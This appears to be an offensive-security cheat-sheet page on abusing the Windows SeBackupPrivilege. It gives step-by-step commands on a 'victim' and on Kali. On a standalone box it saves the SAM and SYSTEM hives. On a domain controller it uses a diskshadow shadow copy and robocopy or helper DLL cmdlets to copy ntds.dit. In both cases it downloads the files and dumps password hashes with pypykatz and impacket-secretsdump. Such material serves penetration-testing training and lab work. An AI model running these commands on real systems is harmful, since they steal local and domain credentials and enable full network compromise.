# SeBackupPrivilege

{% embed url="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" %}

## Method 1

### Standalone Windows Box

```
# on victim
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system

download sam
download system

# on kali
pypykatz registry --sam sam system
```

### Domain Controller

This privilege only allows you to make backups not copies

```
# on kali
nano pwn.dsh
set context persistent nowriters
add volume c: alias pwn
create
expose %pwn% z:
unix2dos pwn.dsh

# on victim
cd C:\Temp
upload pwn.dsh
diskshadow /s pwn.dsh
robocopy /b z:\windows\ntds . ntds.dit

reg save hklm\system c:\Temp\system
cd C:\Temp
download ntds.dit
download system

# on kali
impacket-secretsdump -ntds ntds.dit -system system local
```

## Method 2

{% embed url="https://github.com/giuliano108/SeBackupPrivilege" %}

```
# on kali
nano pwn.dsh
set context persistent nowriters
add volume c: alias pwn
create
expose %pwn% z:
unix2dos pwn.dsh

# on victim
cd C:\Temp
upload pwn.dsh
upload SeBackupPrivilegeUtils.dll
upload SeBackupPrivilegeCmdLets.dll

Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
diskshadow /s pwn.dsh

Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
reg save hklm\system c:\Temp\system
cd C:\Temp
download ntds.dit
download system

# on kali
impacket-secretsdump -ntds ntds.dit -system system local
```
